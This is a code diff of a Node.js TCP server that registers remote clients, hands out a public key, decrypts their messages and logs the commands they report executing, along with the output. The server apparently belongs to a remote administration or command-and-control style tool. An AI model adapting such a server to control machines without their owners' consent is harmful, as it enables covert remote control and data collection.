@@ -25,6 +25,7 @@ function startSockets() {
 	const statusurl = "https://127.0.0.1:5000/status"
 	let sockets = [];
 	let websocket = [];
+	const keys = ciph.genkeypair();
 	server.listen(port, host, () => {
 		console.log(`TCP server listening on ${host}:${port}`);
 		db.connect( async (err) =>{
@@ -34,90 +35,92 @@ function startSockets() {
 				var update = doc
 			})
 		});
-		const keys = ciph.genkeypair()
-		console.log(ciph.encrypt("test",keys[1]))
 	});
-	server.on("connection", (socket) => {
+	server.on("connection", async (socket) => {
 		var clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
 		console.log(`new client connected: ${clientAddress}`);
-		socket.on("data", (data) => {
+		socket.on("data", async (data) => {
 	    	console.log(`${clientAddress}: ${data}`); //output mensaje cliente
 	    	//si getdata == a GET
 	    	var getdata = String(data).split(" ", 2);
-	    	console.log(`getdata : ${getdata[0]}`)
-	    	if (getdata[0] === "GET") {
-	    		try {
-		    		websocket.push(socket); 		
-		    		resp.httpRes(socket, sockets, getdata) //funcion callback-manager httpRes
-	    		} catch (error) {
-					console.log(error)
-				}
-			} else if( data==="get public key"){
+			//console.log(`getdata : ${getdata[0]}`)
+			if( data == 'get public key'){
 				socket.write(keys[0])
-	    	} else{
-	    		const pData = JSON.parse(data)
-	    	   	if (pData.head.id === 0) { //identifica cliente con  id 0
-			    		db.connect( async (err) =>{
-				    		var jstring= {ip: socket.remoteAddress, status:{alive: true, lastconnection: new Date()}} 
-				   			console.log(jstring)
-				    		var cliColl = db.getColl(collections[0])
-				   			console.log("insertando nuevo cli")
-				   			await db.insertDocument(cliColl, jstring).then((doc) => {
-				   				//print client ID
-				   				socket["id"] = JSON.stringify(doc.insertedId);
-				   			});
-			    			sockets.push(socket);
-			    			socket.write(`{ "id" : ${socket["id"]}}`)
-			    			console.log(sockets.length);
-			    		});
-			    		console.log("id 0")
-		    	}else { //cuando el cliente ya tiene idpointer
-		    		socket["id"] = JSON.stringify(pData.head.id)
+			}
+			else{
+				if (getdata[0] === "GET") {
+					try {
+						websocket.push(socket); 		
+						resp.httpRes(socket, sockets, getdata) //funcion callback-manager httpRes
+					} catch (error) {
+						console.log(error)
+					}
+				} else{
+					
+					let decrypted = await ciph.decrypt(data, keys[1])
+					const pData = JSON.parse(decrypted)
+					if (pData.head.id === 0) { //identifica cliente con  id 0
+							db.connect( async (err) =>{
+								var jstring= {ip: socket.remoteAddress, status:{alive: true, lastconnection: new Date()}} 
+								console.log(jstring)
+								var cliColl = db.getColl(collections[0])
+								console.log("insertando nuevo cli")
+								await db.insertDocument(cliColl, jstring).then((doc) => {
+									//print client ID
+									socket["id"] = JSON.stringify(doc.insertedId);
+								});
+								sockets.push(socket);
+								socket.write(`{ "id" : ${socket["id"]}}`)
+								console.log(sockets.length);
+							});
+							console.log("id 0")
+					}else { //cuando el cliente ya tiene idpointer
+						socket["id"] = JSON.stringify(pData.head.id)
 
-		    		if (pData.body.message === "Command executed"){
-		    			//console.log(pData)
-		    			var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
-		    			db.connect( async (err) =>{ //input a la BBDD del output del comando
-		    				var cjstring = {data: new Date(), cmd: pData.body.command, output: pData.body.output, client:pData.head.id}
-		    				var cmdColl = await db.getColl(collections[1])
-		    				await db.insertDocument(cmdColl, cjstring)
-		    				console.log("input del output de la cmd")
-		    			})
-		    			fetch(outputurl, {
-						  method: 'POST', // or 'PUT'
-						  headers:{
-						    'Content-Type': 'application/json',
-						    'Accept': 'application/json'
-						  },
-						  body: JSON.stringify(outdata), // data can be `string` or {object}!
-						  agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
-						}).catch(error => console.error('Error:', error))
-		    		}
-		    		if (sockets.includes(socket)===false){
-		    			sockets.push(socket);
-
-		    			db.connect( async (err) =>{
-							var cliColl = await db.getColl(collections[0])
-							const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
-							console.log("La id: ", ObjectId)
-							await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:true, lastconnection: new Date()}}}).then((doc) =>{
-								var update = doc
-								console.log(doc)
+						if (pData.body.message === "Command executed"){
+							//console.log(pData)
+							var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
+							db.connect( async (err) =>{ //input a la BBDD del output del comando
+								var cjstring = {data: new Date(), cmd: pData.body.command, output: pData.body.output, client:pData.head.id}
+								var cmdColl = await db.getColl(collections[1])
+								await db.insertDocument(cmdColl, cjstring)
+								console.log("input del output de la cmd")
 							})
-						})
-						var alive = {alive:true}
-						fetch(statusurl, {
+							fetch(outputurl, {
 							method: 'POST', // or 'PUT'
 							headers:{
-							  'Content-Type': 'application/json',
-							  'Accept': 'application/json'
+								'Content-Type': 'application/json',
+								'Accept': 'application/json'
 							},
-							body: JSON.stringify(alive), // data can be `string` or {object}!
+							body: JSON.stringify(outdata), // data can be `string` or {object}!
 							agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
-						  }).catch(error => console.error('Error:', error))
-		    		}
-		    	}
-	    	};
+							}).catch(error => console.error('Error:', error))
+						}
+						if (sockets.includes(socket)===false){
+							sockets.push(socket);
+
+							db.connect( async (err) =>{
+								var cliColl = await db.getColl(collections[0])
+								const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
+								console.log("La id: ", ObjectId)
+								await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:true, lastconnection: new Date()}}}).then((doc) =>{
+									var update = doc
+								})
+							})
+							var alive = {alive:true}
+							fetch(statusurl, {
+								method: 'POST', // or 'PUT'
+								headers:{
+								'Content-Type': 'application/json',
+								'Accept': 'application/json'
+								},
+								body: JSON.stringify(alive), // data can be `string` or {object}!
+								agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
+							}).catch(error => console.error('Error:', error))
+						}
+					}
+				};
+			};
 	    });
 		socket.on('close', (data) => {
 			var socl = sockets.includes(socket); //busca en el array si es troba el socket
@@ -134,7 +137,6 @@ function startSockets() {
 					console.log("La id: ", ObjectId)
 					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false, lastconnection: new Date()}}}).then((doc) =>{
 						var update = doc
-						console.log(doc)
 					})
 				})
 				var alive = {alive:true}
